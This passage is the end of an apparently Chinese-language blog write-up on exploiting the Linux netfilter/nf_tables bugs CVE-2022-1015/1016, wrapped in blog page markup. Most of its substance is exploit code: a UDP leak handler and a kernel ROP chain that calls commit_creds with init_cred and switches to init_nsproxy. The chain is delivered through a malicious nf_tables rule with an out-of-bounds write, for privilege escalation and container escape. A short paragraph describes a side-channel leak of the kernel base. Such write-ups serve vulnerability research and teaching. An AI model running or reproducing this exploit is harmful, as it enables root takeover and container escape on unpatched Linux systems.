class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid) { </span><br><span class="line">        <span class="comment">// parent process       将新进程的进程号保存下来, 以便退出时调用 kill_children() kill 所有进程</span></span><br><span class="line">        add_child(pid);      </span><br><span class="line">        <span class="keyword">return</span> pid;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    handler(s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">leak_handler</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4096</span>] = {};</span><br><span class="line">    <span class="type">char</span> send_back[] = <span class="string">"MSG_OK"</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span> =</span> {};</span><br><span class="line">    <span class="type">socklen_t</span> client_addr_size = <span class="keyword">sizeof</span> client_addr;</span><br><span class="line">    <span class="type">size_t</span> conn_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) {</span><br><span class="line">        <span class="type">int</span> len = recvfrom(fd, buf, <span class="keyword">sizeof</span> buf - <span class="number">1</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)&amp;client_addr, &amp;client_addr_size);</span><br><span class="line">        <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) </span><br><span class="line">            err_exit(<span class="string">"listener receive failed..\n"</span>);</span><br><span class="line">        </span><br><span class="line">        sendto(fd, buf, len, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)&amp;client_addr, client_addr_size);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>


<p>再用相同的方式创建越界写的恶意规则, 往返回地址处写入ROP链, 即可完成提权+逃逸.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">buff[i++] = pop_rdi_ret;</span><br><span class="line">buff[i++] = init_cred;</span><br><span class="line">buff[i++] = commit_creds;</span><br><span class="line">buff[i++] = pop_rdi_ret;</span><br><span class="line">buff[i++] = getpid();</span><br><span class="line">buff[i++] = find_task_by_vpid;</span><br><span class="line">buff[i++] = mov_rdi_rax_ret;</span><br><span class="line">buff[i++] = pop_rsi_ret;</span><br><span class="line">buff[i++] = init_nsproxy;</span><br><span class="line">buff[i++] = switch_task_namespaces;</span><br><span class="line">buff[i++] = kpti_trampoline;</span><br><span class="line">buff[i++] = <span class="number">0</span>; <span class="comment">//dummy rax</span></span><br><span class="line">buff[i++] = <span class="number">0</span>; <span class="comment">//dummy rdi</span></span><br><span class="line">buff[i++] = user_rip;</span><br><span class="line">buff[i++] = user_cs;</span><br><span class="line">buff[i++] = user_rflags;</span><br><span class="line">buff[i++] = user_sp;</span><br><span class="line">buff[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">v.max_len = <span class="number">0xff</span>;</span><br><span class="line">v.value = <span class="number">0x7fffffCA</span>+<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">handle = <span class="number">4</span>;</span><br><span class="line">aux_rule = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, &amp;handle);</span><br><span class="line">rule_add_payload(aux_rule, NFT_PAYLOAD_INNER_HEADER, <span class="number">8</span>, v.max_len, v.value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">err = send_batch_request(</span><br><span class="line">    nl,</span><br><span class="line">    NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="number">8</span>),</span><br><span class="line">    NLM_F_CREATE|NLM_F_REPLACE, NFPROTO_IPV4, (<span class="type">void</span>**)&amp;aux_rule, &amp;seq,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">    err_exit(<span class="string">"Failed rule_add_payload"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buff[<span class="number">0</span>] = MAGIC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sendto(sock,buff, <span class="number">0x120</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) &lt; <span class="number">0</span>) {</span><br><span class="line">    perror(<span class="string">"Sendto failed"</span>);</span><br><span class="line">    close(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20241130004721.png"></p>
<h4 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h4><p>原作者在利用过程中并没有使用nft_payload_set来泄露内核地址, 而是利用了netfilter本身的功能来进行测信道: 过滤特定数据包. 通过nft_bitwise越界将内核地址拷贝到regs中, 再使用cmp指令对内核地址进行逐字节猜测爆破, 若猜错则Drop掉该包, 最终得到内核基址.</p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20240714125127/https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/">https://web.archive.org/web/20240714125127/https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/542451347">https://zhuanlan.zhihu.com/p/542451347</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/Dig%20into%20Netfilter%20(2)/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Netfilter/" rel="tag">Netfilter</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2024/Dig%20into%20Netfilter%20(3)/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            Dig into Netfilter (三) —— CVE-2022-1972 / CVE-2022-2078
          
        </div>
      </a>
    
    
      <a href="/2024/Dig%20into%20Netfilter%20(1)/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">Dig into Netfilter (一)  —— nf_tables核心概念</div>
      </a>
    
  </nav>

  
   
    
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2025
        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2022/About">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>